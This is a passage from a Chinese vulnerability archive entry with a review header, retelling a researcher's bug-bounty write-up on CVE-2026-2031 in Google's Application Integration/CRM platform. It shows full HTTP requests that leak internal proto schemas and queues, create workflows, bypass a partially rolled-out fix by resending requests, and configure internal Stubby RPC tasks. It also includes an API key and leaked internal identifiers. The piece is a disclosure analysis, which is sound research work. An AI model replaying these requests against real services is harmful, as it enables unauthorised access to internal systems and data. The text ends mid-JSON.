---
cve: "CVE-2026-2031"
source: "gelusus/wxvl 公众号漏洞文库"
id: "vw-bc22f366b6aaf0abcf5df879"
entity_id: "ve-bc22f366b6aaf0abcf5df879"
schema_version: "1"
title: "2026年还能让Google掏出百万奖金的漏洞"
product: "Google Cloud Application Integration/内部CRM Integration Platform"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2026-2031"
referenced_identifiers: ""
prerequisites: "需Google账户、一方认证或项目Bearer权限；两账号发布、内部RPC仍受peer政策限制；云端分阶段修复"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Google/2026%E5%B9%B4%E8%BF%98%E8%83%BD%E8%AE%A9Google%E6%8E%8F%E5%87%BA%E7%99%BE%E4%B8%87%E5%A5%96%E9%87%91%E7%9A%84%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

#  2026年还能让Google掏出百万奖金的漏洞  

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Google Cloud Application Integration/内部CRM Integration Platform
- 本文讨论：文统称StubZero CVE-2026-2031，含schema/队列泄露、ACL、IDOR与内部Stubby任务多原语
- 版本、权限与配置前提：需Google账户、一方认证或项目Bearer权限；两账号发布、内部RPC仍受peer政策限制；云端分阶段修复
- 资料类型：Google Cloud研究长篇改编；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 安全设备/Google分类过宽，实际云编排服务；元数据单CVE未说明两轮多原语映射
- 标题百万奖金未标币种，正文累计148337美元，不宜直接认为百万美元
- 正文明确两轮未实际执行服务器代码且第二轮由厂商确认后叫停，摘要完整RCE需标厂商定级与作者实证区别
- 第二轮IDOR与创建自己内部任务可能是独立路径，流程图画成必经串行链过度
- 部分JSON含全角空格/省略号及图表压平不可直接复用；示例2026-05-01与3月升级/4月奖励时间需解释为重测
- 几乎必然提权与全球任意资源范围超出展示证据；公开API key和业务对象标识仍需去敏审查

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- CVE是否覆盖所有原语、厂商确认/奖励邮件与修复完成状态待原源核验；本审阅未调用文中任何API
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->

原创 一个不正经的黑客
                    一个不正经的黑客  一个不正经的黑客   2026-09-14 00:30  
  
安全研究 · GOOGLE CLOUD RCE  
  
StubZero：Google Cloud 生产环境的两轮 RCE，与 $148,337 赏金  
  
CVE-2026-2031  
  
生产环境 RCE · 累计赏金 $148,337  
  
一句话结论  
  
一次调试接口的信息泄露，两次演变成同一类错误——把租户可控的配置直接当成 Google 内部的高权限 Stubby 调用。  
  
第一轮 $60,000，第二轮 $75,000，事后又追加 $13,337。  
  
一  
一条私信，两块拼图，和窗口关闭前的一小时  
  
起初只是一个调试端点上的信息泄露，最后升级成 Google Cloud 生产环境的完整远程代码执行。  
  
三个月后，同样的事情又来了一遍。  
  
这个漏洞被分配为 CVE-2026-2031。  
  
故事从我的一个自动化 fuzzing 工具报警开始：API cloudcrmipfrontend-pa.googleapis.com 对一些可疑端点返回了 200。  
  
再细看，这个 API 上挂着好几个公开的调试端点。  
  
![API explorer screenshot](../../.resource/remote/39779323d0522c9ade48133f7247ad1e8557fdeb02252da2d55520a9a030b938.png "")  
  
  
我用来自测 Google 内部 API 的内部 API 探索工具截图，数据来自一份 discovery document  
  
二  
req2proto as a Service™：proto 定义泄露  
  
其中 GET /v1/integrationPlatform:listServicesByServer 这类端点似乎永远返回内部服务器错误。  
  
但 /v1/integrationPlatform:getProtoDefinition 不一样——它能返回 google3（Google 内部源代码 monorepo）里任意 protobuf message 的 proto 定义，连 YouTube 这种八竿子打不着的服务也不例外。  
  
●  
●  
●  
请求 · getProtoDefinition  
  

```http
GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2  
  
Host: cloudcrmipfrontend-pa.clients6.google.com  
  
Cookie: <redacted>  
  
Authorization: SAPISIDHASH <redacted>  
  
Origin: https://console.cloud.google.com  
  
X-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE  
```


  
关于这里的认证  
  
这个 API 用的是 Google 自家的一方认证（first-party auth）：请求里要带 Google 账号的 Cookie，还要带一个用 SAPISID cookie 计算出来的 Authorization 头，以及被列入白名单的 Origin https://console.cloud.google.com。  
  
●  
●  
●  
响应 · 解码后的 proto 描述符（节选）  
  
{  
  
　"protoDescriptor": {  
  
　　"name": "InnerTubeContext",  
  
　　"field": [  
  
　　　{  
  
　　　　"name": "client",  
  
　　　　"number": 1,  
  
　　　　"label": "LABEL_OPTIONAL",  
  
　　　　"type": "TYPE_MESSAGE",  
  
　　　　"typeName": ".youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo",  
  
　　　　"jsonName": "client"  
  
　　　},  
  
　　　{  
  
　　　　"name": "user",  
  
　　　　"number": 3,  
  
　　　　"label": "LABEL_OPTIONAL",  
  
　　　　"type": "TYPE_MESSAGE",  
  
　　　　"typeName": ".youtube.api.pfiinnertube.YoutubeApiInnertube.UserInfo",  
  
　　　　"jsonName": "user"  
  
　　　},  
  
...  
  
在 Google 内部，一切都是 proto，这就是这件事的分量。  
  
所有 API 在内部都是用 protobuf 定义的 gRPC 服务，这个端点等于把任意端点的请求体与响应体结构全部公开。  
  
对一个像 Google 这样的黑盒目标来说，这就是一座金矿。  
  
早年我写过一个工具 req2proto 专门干这个，但它只能找请求体的 proto，找不到响应体，而且还要求 API 支持 JSPB（application/json+protobuf）——大多数 API 并不支持。  
  
我和朋友后来干脆把这个端点称作「req2proto as a service」：字面上就是一个托管版、而且强得多的同款工具。  
  
漏洞点评  
  
schema 泄露不是信息泄露的边角料，它把黑盒测试直接抬成白盒——字段、类型、嵌套结构都不用再猜，整个内部 API 的攻击面被一次性摊开。  
  
后面每一个「我知道该填什么参数」，地基都在这里。  
  
继续下探之前，我先看了一圈还有没有别的端点也在漏信息。  
  
三  
泄露内部工作流执行队列  
  
![listQuotaQueue endpoint screenshot](../../.resource/remote/7d591fec098d5aac3c43da18a3e7ef456277f00565cc24694198574bf7092dc7.jpg "")  
  
  
API 探索工具里的 listQuotaQueue 端点  
  
一开始不带任何查询参数，这个端点只返回 INVALID_ARGUMENT。  
  
试 * 之类的过滤也不管用。  
  
但凭以往经验，这类 filter 参数通常允许按 google.aip.dev/160 的规范做任意过滤。  
  
于是我把 filter 换成 client_id>"123"，拿到一个有意思的响应：  
  
●  
●  
●  
响应  
  
{  
  
　"error": {  
  
　　"code": 500,  
  
　　"message": "Failed to convert server response to JSON",  
  
　　"status": "INTERNAL"  
  
　}  
  
}  
  
看起来它想返回的东西没有 JSON 映射。  
  
但 Google API 支持用标准的 ?alt= 参数改变响应内容类型，比如 ?alt=proto 就会返回 protobuf。  
  
唯一的问题是：  
  
因为我们用的是一方认证（Cookie 加 Authorization 头），请求必须打到 cloudcrmipfrontend-pa.clients6.google.com，而不是 cloudcrmipfrontend-pa.googleapis.com。  
  
而 Google 不允许发往 *.google.com 的请求返回裸 proto：  
  
●  
●  
●  
响应  
  
Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.com  
  
好在有绕法。  
  
加上 X-Goog-Encode-Response-If-Executable: base64 头，响应就会以 base64 而不是二进制返回：  
  
●  
●  
●  
请求 · listQuotaQueue  
  

```http
GET /v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto HTTP/2  
  
Host: cloudcrmipfrontend-pa.clients6.google.com  
  
Cookie: <redacted>  
  
Authorization: SAPISIDHASH <redacted>  
  
Origin: https://console.cloud.google.com  
  
X-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE  
  
X-Goog-Encode-Response-If-Executable: base64  
```


  
API 返回了一大段 base64 的 protobuf。  
  
用前面那个 proto 定义泄露端点取到 ListQuotaQueueResponse 的 schema 后，我把它正确解码了出来——这是一个内部工作流执行队列，里面包括把数据从 Spanner 同步到 Salesforce 的工作流：  
  
●  
●  
●  
解码后的队列条目（节选）  
  
{  
  
　"queue_items": [  
  
　　{  
  
　　　"queued_request": {  
  
　　　　"queued_request_id": "75a885e2-c611-43f7-b4e2-ae0d87bae789",  
  
　　　　"client_id": "default",  
  
　　　　"workflow_name": "WriteToSfdc",  
  
　　　　"priority": "CRITICAL",  
  
　　　　"received_timestamp": 1763057385562,  
  
　　　　"event_execution_info_id": "615cd9a9-9c0e-46ec-90df-91ee42ec9c37"  
  
　　　},  
  
　　　"event_execution_info": {  
  
　　　　"client_id": "default",  
  
　　　　"workflow_name": "WriteToSfdc",  
  
　　　　"trigger_id": "api_trigger/WriteToSfdc",  
  
　　　　...  
  
　　　　"type_url": "type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest",  
  
　　　　...  
  
　　　　"sfdc_object": {  
  
　　　　　"vector_account": {  
  
　　　　　　"id": "001Kf00000wjeK3IAI",  
  
　　　　　　"due_diligence__c": "Pending",  
  
　　　　　　"due_diligence_sub_status__c": "1. PENDING DD - Initial Submission Review"  
  
　　　　　　...  
  
　　　　　}  
  
　　　　}  
  
　　　}  
  
　　}  
  
　]  
  
}  
  
拿到这些之后不久，我就把这两个漏洞报了上去。  
  
几个小时后就定级为 P0/S0，还收到一句 Nice catch。  
  
四  
还能再往上走吗：Stubby 与 LOAS 信任模型  
  
到这我基本确信这个 API 里还有更多东西，于是开始把工作流相关的端点全看了一遍。  
  
这个 API 看起来跟 Google Cloud 的 Application Integration 有关。  
  
它允许你定义一个 workflow，提供 triggerConfig 说明什么条件触发它，提供 taskConfig 说明要触发什么任务。  
  
最扎眼的是，discovery document 里隐约出现了一个叫 GenericStubbyTypedTask 的任务，看起来可以配置工作流去执行它——危险信号当场就亮起来了。  
  
●  
●  
●  
discovery document 里的任务配置模块（节选）  
  
"EnterpriseCrmEventbusProtoTaskUiModuleConfig": {  
  
　"description": "Task author would use this type to configure a config module.",  
  
　"id": "EnterpriseCrmEventbusProtoTaskUiModuleConfig",  
  
　"properties": {  
  
　　"moduleId": {  
  
　　　"description": "ID of the config module.",  
  
　　　"enum": [  
  
　　　　...  
  
　　　　"RPC_TYPED",  
  
　　　　...  
  
　　　],  
  
　　　"enumDescriptions": [  
  
　　　　...  
  
　　　　"Configures a GenericStubbyTypedTask.",  
  
　　　　...  
  
　　　],  
  
　　}  
  
　}  
  
}  
  
Google SRE 书 · 关于 Stubby  
  
Google 所有服务都通过一套名为 Stubby 的远程过程调用（RPC）基础设施通信，它的开源版本就是 gRPC。  
  
很多时候，哪怕只是调用本地程序里的一个子例程，也会走一次 RPC——这样在需要更高模块化、或某个服务的代码库膨胀时，把调用重构到另一台服务器上会更容易。  
  
按照我的理解，Borg（也就是 Google Production）遵循一套安全模型：每个 borgtask 服务都有自己的身份。  
  
当你向一个 *.googleapis.com 端点发请求时，前端服务会用它自己的 prod service identity 向后端服务发起 Stubby 调用，同时把你的终端用户上下文装在一张 security ticket 里带过去。  
  
如果 ticket 里带的是你的 Gaia 用户 ID，后端就会以那个用户的身份来授权。  
  
时序图 · 一方 API 的信任传递：前端出借身份，后端认 ticket终端用户前端服务后端 borgtask1带 Cookie + SAPISIDHASH 调一方 API2前端用自己的 service identity 发起 Stubby 调用3用户上下文装进 security ticket 一并带过去4ticket 是 GAIA_MINT → 按该 Gaia 用户授权5查 RpcSecurityPolicy 决定是否放行唯一闸门6返回该用户有权访问的数据  
  
下面是两段从 Google API 错误响应里泄露出来的 security ticket，一段匿名、一段带一方认证，可以先对比着看 peer 块的差别：  
  
●  
●  
●  
security ticket · 未认证（匿名）  
  
com.google.apps.framework.auth.IamPermissionDeniedException:  
  
　IAM authority does not have the permission 'cloudprivatecatalog.targets.get'  
  
　required for action PrivateCatalogV1Beta1-SearchProducts  
  
　on resource ''.Explanation:  
  
Security Context:  
  
　ValidatedSecurityContextWithSystemAuthorizationPolicy  
  
　　delegate = ValidatedSecurityContextWithRegistryHandle  
  
　　　delegate = ValidatedSecurityContextWithObligations  
  
　　　　delegate = ValidatedIamSecurityContext  
  
　　　　　user  = anonymous  
  
　　　　　creds = EndUserCreds  
  
　　　　　　loggable_credential {  
  
　　　　　　　type = SERVICE_CONTROL_TOKEN  
  
　　　　　　}  
  
　　　　　　access_assertion: ANONYMOUS  
  
　　　　　peer =  
  
　　　　　　protocol                = loas  
  
　　　　　　level                   = strong_privacy_and_integrity  
  
　　　　　　host                    = jxcbu6.prod.google.com  
  
　　　　　　role                    = cloud-commerce-catalog  
  
　　　　　　user                    = cloud-boq-clientapi-catalog  
  
　　　　　　is_delegated            = true  
  
　　　　　　jobname_chosen_by_user  = prod.cloud-commerce-catalog  
  
●  
●  
●  
security ticket · 一方认证（Gaia 用户）  
  
com.google.apps.framework.auth.IamPermissionDeniedException:  
  
　IAM authority does not have the permission 'resourcemanager.projects.get'  
  
　required for action GetServiceAccessStatus  
  
　on resource 'projects/613988253758'.Explanation:  
  
Security Context:  
  
　ValidatedSecurityContextWithCloudPolicyChecks  
  
　　delegate = ValidatedSecurityContextWithCpeContext  
  
　　　delegate = ValidatedSecurityContextWithObligations  
  
　　　　delegate = ValidatedSecurityContextWithRegistryHandle  
  
　　　　　delegate = ContextWithGaiaMintToken  
  
　　　　　　delegate = ValidatedIamSecurityContext  
  
　　　　　　　user  = gaiauser/0xaa22527678  
  
　　　　　　　creds = EndUserCreds  
  
　　　　　　　　loggable_credential {  
  
　　　　　　　　　type = GAIA_MINT  
  
　　　　　　　　}  
  
　　　　　　　peer =  
  
　　　　　　　　protocol                = loas  
  
　　　　　　　　level                   = strong_privacy_and_integrity  
  
　　　　　　　　host                    = pjf8.prod.google.com  
  
　　　　　　　　role                    = commerceorggovernance-clh  
  
　　　　　　　　gaiaId                  = 640201889743  
  
　　　　　　　　security_realm          = campus-dls  
  
　　　　　　　　is_delegated            = false  
  
　　　　　　　　borgcell                = pj  
  
　　　　　　　　jobname_chosen_by_user  = prod.commerceorggovernance-clh  
  
两段里 peer 块展示的都是发起内部 Stubby 调用的 prod service identity，差别只在终端用户上下文：第一张 ticket 是 ANONYMOUS；第二张携带了 GAIA_MINT 凭据。  
  
你在 Google 用 Cookie 或 Bearer 认证时，凭据会被转换成一个标准的 UberMint token，内嵌 GaiaMint——意思是后端会以那个 Gaia 用户的身份授权请求。  
  
这样，一次 /ContactsService.ListContacts 调用就只会返回该授权用户的联系人。  
  
如果我们能以集成平台的 prod service identity 发起任意 Stubby 查询，就能访问到各种各样的 RPC，从敏感用户数据到代码执行都有，具体取决于这个 prod 用户有什么权限。  
  
所以 Google 直接按 RCE 给它定级——攻击面一下大了一个量级。  
  
LOAS 是什么  
  
LOAS（Low Overhead Authentication System）是 Google 内部的认证与加密框架。  
  
不过，就算拿到了一个 Stubby 原语，究竟哪些 RPC 能被调？  
  
Google 里每个 Stubby 服务都定义了自己的 RpcSecurityPolicy，带一份按方法粒度的白名单。  
  
这是 Cloud SQL Speckle Boss 进程里的一份真实配置：  
  
●  
●  
●  
RpcSecurityPolicy · Cloud SQL Speckle Boss 进程  
  
mapping {  
  
　rpc_method: "/SaasActuation.UpdateInstance"  
  
　rpc_method: "/MaintenancePolicyService.CreateMaintenancePolicy"  
  
　...  
  
　authentication_policy {  
  
　　creds_policy {  
  
　　　rules {  
  
　　　　permissions: "auth.creds.useProdUserEUC"  
  
　　　　action: ALLOW  
  
　　　　in: "mdb:zamm-exe-3-cloud-sql--default-policy"  
  
　　　　in: "user:speckle-tool-proxy@prod.google.com"  
  
　　　}  
  
　　　rules {  
  
　　　　permissions: "auth.creds.useLOAS"  
  
　　　　action: ALLOW  
  
　　　　in: "allUsers"  
  
　　　}  
  
　　}  
  
　}  
  
　authorization_mode: MANUAL_IAM  
  
　permission_to_check: "cloudsql.instances.rollout"  
  
}  
  
每个 mapping 块列出一组 RPC 方法，并声明哪类调用者可以用哪种凭据调用它们。  
  
按这个读法，auth.creds.useLOAS 的意思是「任何 borgtask 都可以用它自己的 LOAS 身份来调」，而 auth.creds.useProdUserEUC 的意思是「只有这些特定的 MDB 组，才允许把一个 Gaia 终端用户身份（也就是一个 UberMint token）转进这次调用」。  
  
permission_to_check 则告诉后端，最终解析出来的身份需要对什么 IAM 权限做校验。  
  
所以即便偷到了 Stubby 原语，你也不能随手调用天下所有 RPC——只能碰到那些 RpcSecurityPolicy 允许你的 peer identity 通过的方法。  
  
但即便如此，可达攻击面已经是一次巨幅扩张。  
  
我第一次尝试创建工作流时，收到一个 INVALID_ARGUMENT：  
  
●  
●  
●  
请求 · createDraftWorkflow  
  

```http
POST /v1/integrationPlatform:createDraftWorkflow HTTP/2  
  
Host: cloudcrmipfrontend-pa.clients6.google.com  
  
Cookie: <redacted>  
  
Authorization: SAPISIDHASH <redacted>  
  
Origin: https://console.cloud.google.com  
  
X-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE  
  
Content-Type: application/json  
  
Content-Length: 197  
  
  
{  
  
　"workflow": {  
  
　　"name": "my-new-workflow-test",  
  
　　"origin": "UI",  
  
　　"triggerConfigs": [],  
  
　　"taskConfigs": []  
  
　},  
  
　"isNewWorkflow": true  
  
}  
```


  
●  
●  
●  
响应  
  
{  
  
　"error": {  
  
　　"code": 400,  
  
　　"message": "Request contains an invalid argument.",  
  
　　"status": "INVALID_ARGUMENT"  
  
　}  
  
}  
  
如果这个请求从 Google 内网发出，它会直接吐完整堆栈，而不是这种笼统的错误。  
  
我怀疑是漏了一个必填参数，很可能是 clientId。  
  
想起前面 listQuotaQueue 的响应里泄露过 "client_id": "default"，我把它填进去，成功了：  
  
●  
●  
●  
请求 · createDraftWorkflow（带上 clientId）  
  
```http
POST /v1/integrationPlatform:createDraftWorkflow HTTP/2  
  
Host: cloudcrmipfrontend-pa.clients6.google.com  
  
Content-Type: application/json  
  
  
{  
  
　"workflow": {  
  
　　"name": "my-new-workflow-test",  
  
　　"origin": "UI",  
  
　　"clientId": "default",  
  
　　"triggerConfigs": [],  
  
　　"taskConfigs": []  
  
　},  
  
　"isNewWorkflow": true  
  
}  
```

  
●  
●  
●  
响应  
  
{  
  
　"workflow": {  
  
　　"workflowId": "53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e",  
  
　　"name": "my-new-workflow-test",  
  
　　"origin": "UI",  
  
　　"creatorEmail": "admin@gvrptest.cry.dev",  
  
　　"createdTime": "2025-12-01T04:19:14.449503Z",  
  
　　"status": "DRAFT",  
  
　　"snapshotNumber": "1",  
  
　　"tags": ["HEAD"],  
  
　　"lockedBy": "admin@gvrptest.cry.dev",  
  
　　"clientId": "default"  
  
　}  
  
}  
  
但要跑起一个工作流，得先发布它，而我就卡在这：  
  
●  
●  
●  
请求 · publishWorkflow  
  
```http
POST /v1/integrationPlatform:publishWorkflow HTTP/2  
  
Host: cloudcrmipfrontend-pa.clients6.google.com  
  
Content-Type: application/json  
  
  
{  
  
　"workflowId": "53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e"  
  
}  
```

  
●  
●  
●  
响应 · 403  
  
{  
  
　"error": {  
  
　　"code": 403,  
  
　　"message": "Publisher admin@gvrptest.cry.dev cannot be the same as the last editor admin@gvrptest.cry.dev of the integration my-new-workflow-test with snapshot number 1 and integration ID 53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e being edited from the UI. Please raise a Request to Publish and have your change approved by another person.",  
  
　　"status": "PERMISSION_DENIED"  
  
　}  
  
}  
  
我得想办法往工作流里加另一个用户，用它来发布。  
  
当时我试过用 ACL 端点加账号，但没能把权限配通。  
  
漏洞点评  
  
「发布者不能等于最后编辑者」是一次两人审批（four-eyes）检查，但防线做在产品功能层，而不是权限系统层——只要 ACL 端点可写，两个攻击者账号就能绕过去。  
  
五  
那条改变一切的私信：第一轮 RCE  
  
![Discord DM screenshot](../../.resource/remote/98bfee8fae5cfcc4f3f8e4469c02d6e2cae09895bc32637c57548970789f56d9.jpg "")  
  
  
那条私信：我随口提到自己有一个能泄露 Google 内部 protobuf 定义的 bug  
  
初次上报一个多月后，我在一个只有几个研究员的 Discord 群里，随口说自己有个 bug 能泄露 Google 内部的 protobuf 定义。  
  
就在那时，shrugged 说他也碰到了同一个 bug，我们的对话就此打开。  
  
原来 shrugged 在研究另一个 bug 时，从 Application Integration 的 JavaScript 文件里看到了这些端点，也一直在查同一个 API。  
  
他已经注意到 GenericStubbyTypedTask 可能是 RCE 入口，但卡在创建工作流所需的合法 client_id 上。  
  
而我手里有从配额队列泄露出来的 client_id，卡在发布这一步。  
  
我们很快交换了笔记：  
  
我把 client_id: "default" 和卡住的位置给了他，然后一起往下推。  
  
一个人做不成这件事。  
  
漏洞点评  
  
研究卡住的时候，人容易把「我走不通」读成「这条路走不通」。  
  
shrugged 卡在 client_id，另一个人卡在发布——死结正好是对方的钥匙。  
  
这条链少一个人都跑不完，而它被解开，只因为一句在 Discord 群里随口说出的话。  
  
Google 已经针对我最初的报告上线了修复，所以很多原始端点开始返回 PERMISSION_DENIED。  
  
但很快发现，不少端点在不同服务名下有一比一的功能对应版本：  
  
<table><thead><tr><th style="background:#f1f5f9;color:#0f172a;text-align:left;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;font-weight:700;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="D1EZi2FTAfUvtdVAyEXtI4" data-dm-ref="921">原始端点（已被封）</span></section></th><th style="background:#f1f5f9;color:#0f172a;text-align:left;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;font-weight:700;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="BlkcrjLLr2bBIkcrKPm3Gg" data-dm-ref="923">对应版本（当时仍然放行）</span></section></th></tr></thead><tbody><tr><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="IxLlg3sf567GipPs5uBYBz" data-dm-ref="927">/v1/integrationPlatform:getProtoDefinition</span></section></td><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="TlKB5ChBWceTh5N1pjFjyf" data-dm-ref="929">/v1/integrationPlatform/workflowsupport:getProtoDefinition</span></section></td></tr><tr><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="pktDkDbbqDwBFsC0Plxu4p" data-dm-ref="932">/v1/integrationPlatform:runWorkflow</span></section></td><td style="background:#fafbfc;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="HdmZQbL1ZJHr5LvVmS7A3R" data-dm-ref="934">/v1/integrationPlatform/workflowexecution:runWorkflow</span></section></td></tr><tr><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="eaWe8eiPG6zIGutWu7TlmO" data-dm-ref="937">/v1/integrationPlatform:setAcl</span></section></td><td style="background:#ffffff;color:#334155;padding:8px 10px;border:1px solid #e5e7eb;font-size:14px;line-height:1.7;letter-spacing:0;"><section><span style="letter-spacing:0;" leaf="" data-page-node-id="E08GJDPfIHQUaY7CfNpd4r" data-dm-ref="939">/v1/integrationPlatform/auth:setAcl</span></section></td></tr></tbody></table>  
  
最初的修复只封掉了原始的 WorkflowEditorService 端点，没有封这些对应版本。  
  
问题出在 createDraftWorkflow——我们找不到它的对应版本，它一直返回 PERMISSION_DENIED：  
  
●  
●  
●  
响应  
  
{  
  
　"error": {  
  
　　"code": 403,  
  
　　"message": "The caller does not have permission",  
  
　　"status": "PERMISSION_DENIED"  
  
　}  
  
}  
  
奇怪的是，shrugged 跑同样的请求第一次就成功了，而我稳定地拿到 PERMISSION_DENIED。  
  
这时候就明白了：  
  
修复还没有在所有负载均衡后端上全部生效。  
  
反复重发同一个请求，就能稳定地命中一台仍然放行的后端：  
  
漏洞点评  
  
修复上线不等于修复生效：  
  
灰度、多后端，任何一层没刷完，漏洞就还在，而攻击者只要重发请求，就能稳定命中漏网的那台。  
  
这一次他们赢得很险——PoC 跑通后一小时，修复才真正全量。  
  
再晚一点，这轮升级就只能停在理论层面。  
  
●  
●  
●  
重发命中未修复后端  
  
HTTP/2 200 OK  
  
Content-Type: application/json; charset=UTF-8  
  
  
{ "workflow": { "workflowId": "c6141c63-ac7a-4350-b582-7615ef045d0c", "name": "retest",  
  
　"origin": "UI", "creatorEmail": "admin@gvrptest.cry.dev", "createdTime": "...",  
  
　"status": "DRAFT", "snapshotNumber": "1", "tags": [ "HEAD" ],  
  
　"lockedBy": "admin@gvrptest.cry.dev", "clientId": "default" } }  
  
但任务名 GenericStubbyTypedTask 似乎并不存在。  
  
看 /v1/integrationPlatform:listTaskEntities 的响应（用 getProtoDefinition 拿到的 proto 定义解码），它似乎只提供 IO_TEMPLATE 类型的任务：  
  
●  
●  
●  
listTaskEntities（节选）  
  
{  
  
　"taskEntities": [  
  
　　{  
  
　　　"metadata": {  
  
　　　　"name": "Delete SFDC Record",  
  
　　　　"descriptiveName": "Delete Salesforce Record",  
  
　　　　"description": "Deletes a record in Salesforce",  
  
　　　　"codeSearchLink": "https://cs.corp.google.com/piper///depot/google3/java/.../GenericRestV2TaskImpl.java"  
  
　　　},  
  
　　　"paramSpecs": {  
  
　　　　"parameters": [  
  
　　　　　{  
  
　　　　　　"key": "salesforceDomain",  
  
　　　　　　"dataType": "STRING_VALUE",  
  
　　　　　　"className": "java.lang.String",  
  
　　　　　　"required": 1  
  
　　　　　},  
  
　　　　...  
  
　　　　]  
  
　　　},  
  
　　　...  
  
　　　"taskType": "IO_TEMPLATE"  
  
　　}  
  
　]  
  
}  
  
GenericStubbyTypedTask 很可能属于底层的 ASIS_TEMPLATE：  
  
●  
●  
●  
任务类型枚举  
  
{  
  
　"taskType": {  
  
　　　"description": "Defines the type of the task",  
  
　　　"enum": [  
  
　　　　"TASK",  
  
　　　　"ASIS_TEMPLATE",  
  
　　　　"IO_TEMPLATE"  
  
　　　],  
  
　　　"enumDescriptions": [  
  
　　　　"Normal IP task",  
  
　　　　"Task is of As-Is Template type",  
  
　　　　"Task is of I/O template type with a different underlying task"  
  
　　　],  
  
　　　"type": "string"  
  
　}  
  
}  
  
真正蹊跷的是，这个端点底层的 RPC 是 google.internal.cloud.crm.ipfrontend.v1.WorkflowEditorService/ListTaskEntities，跟公开产品 Application Integration 的 /$rpc/google.cloud.integrations.v1alpha.Integrations/ListTaskEntities 相似得诡异——不过后者也没有直接返回任何 ASIS_TEMPLATE 任务。  
  
回头看 Application Integration 的 JS 代码：  
  
![Application Integration JS snippet](../../.resource/remote/cb29610f328fddbcbeb61235fe5518fc4160904ef9fc5952e755223e7ecd95be.jpg "")  
  
  
从 Cloud Console 里拿到的 Application Integration JS 片段  
  
●  
●  
●  
JS 里的任务清单（节选）  
  
["Vertex AI - Predict","https://www.gstatic.com/enterprise/crm/eventbus/images/icons/custom_tasks/document_ai.png"],  
  
["GenericStubbyTypedTaskV2","http://gstatic.com/enterprise/crm/eventbus/images/icons/blue/stubby_48px_blue.svg"],  
  
["RunGoogleSqlPlxQueryTask","https://fonts.gstatic.com/s/i/productlogos/plx/v6/192px.svg"],  
  
["ConvertDremelResultToJsonTask","https://www.gstatic.com/images/icons/material/system/2x/settings_googblue_24dp.png"],  
  
确切的任务名是 GenericStubbyTypedTaskV2，还自带图标。  
  
![stubby icon](../../.resource/remote/2d5a0e5acc5a19ce56c0560601a69b18758fb1f0ba7d52c1a20a4848f647429b.svg "")  
  
  
GenericStubbyTypedTaskV2 的图标，出自 Google 内部静态资源  
  
在 Application Integration 上尝试配置 GenericStubbyTypedTask，返回的错误暴露了必填字段：  
  
●  
●  
●  
响应  
  
{  
  
　"error": {  
  
　　"code": 400,  
  
　　"message": "'Required input key serverSpec not present in task GenericStubbyTypedTaskImpl, task number 1.'",  
  
　　"status": "INVALID_ARGUMENT"  
  
　}  
  
}  
  
逐个补齐缺失的 key，最终暴露出 serverSpec、serviceName、serviceMethod。  
  
同样的参数也适用于 GenericStubbyTypedTaskV2。  
  
参考 Ezequiel Pereira 的 protobuf 仓库，加上我们在另一份 discovery document 里发现的 GSLB 地址，我们把任务配置成调用 gslb:alkali-base 上的 /ServerStatus.GetServices。  
  
顺带一提  
  
Alkali 是 Google 内部的一个框架，Googler 可以用极少的样板代码起一个生产级 API。  
  
这类框架也集中了不少安全问题。  
  
●  
●  
●  
创建出的工作流定义（节选）  
  
{"workflow": {"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19", "name": "retest-test123",  
  
